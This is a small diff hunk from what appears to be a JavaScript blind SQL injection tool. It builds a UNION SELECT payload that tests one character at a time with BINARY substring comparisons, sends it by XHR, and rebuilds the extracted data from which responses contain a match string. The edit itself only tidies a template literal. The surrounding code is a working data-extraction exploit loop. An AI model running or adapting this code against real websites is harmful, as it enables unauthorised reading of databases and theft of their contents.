@@ -18,7 +18,7 @@ for (j=0;j<maxlength;j++) {
 	SQL_cmd = `${URL}%20UNION%20SELECT%20null,BINARY substring(${query},${nthchar},1)=%27${charset[i]}%27,null,null;--%20-`;
 	xhr.open('GET',SQL_cmd,false);
 	xhr.onload = function () {
-		if (this.responseText.includes(`${truestring}`)) {
+		if (this.responseText.includes(truestring)) {
 			console.log(`Character number ${nthchar} found: ${charset[i]}`);
 			result += charset[i];
 			}
